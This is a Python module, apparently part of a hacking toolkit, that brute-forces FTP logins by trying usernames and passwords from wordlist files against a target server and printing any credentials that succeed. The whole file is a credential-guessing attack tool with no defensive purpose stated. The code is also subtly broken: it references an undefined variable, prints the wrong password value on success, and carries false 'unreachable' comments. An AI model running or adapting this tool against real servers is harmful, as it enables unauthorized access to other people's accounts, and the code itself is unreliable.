import os
from ftplib import FTP

from ..utils.consts import TOOL_INFORMATION, login_data, prompt


def ftp_login(ftp_server, port, username, password, status):
    if port == None:
        port = 21
    num = 0
    ftp = FTP()
    if status == "1,0":
        for user in open(username, "r").read().splitlines():

            try:
                ftp.connect(ftp_server, port)
                ftp.login(user, password)
                ftp.dir()
                if os.name == "posix":
                    os.system("clear")

                elif os.name == "nt":
                    os.system("cls")  #! unreachable

                print(TOOL_INFORMATION)
                print(login_data(user, password, ftp_server, port))
                exit()
            except:
                print(prompt(user, password, prompt="BAD LOGIN"))
    elif status == "0,1":
        for pas in open(password, "r").read().splitlines():

            try:
                ftp.connect(ftp_server, port)
                ftp.login(username, pas)
                ftp.dir()

                if os.name == "posix":
                    os.system("clear")

                elif os.name == "nt":
                    os.system("cls")  #! unreachable

                print(TOOL_INFORMATION)
                print(login_data(user, password, ftp_server, port))
                exit()
            except:
                print(prompt(user, password, prompt="BAD LOGIN"))
    elif status == "1,1":
        for user in open(username, "r").read().splitlines():

            try:
                password2 = open(password, "r").read().splitlines()[num]
                ftp.connect(ftp_server, port)
                ftp.login(user, password2)
                ftp.dir()

                if os.name == "posix":
                    os.system("clear")

                elif os.name == "nt":
                    os.system("cls")  #! unreachable

                print(TOOL_INFORMATION)
                print(login_data(user, password, ftp_server, port))
                exit()
            except:
                print(prompt(user, password2, prompt="BAD LOGIN"))
            num = num + 1
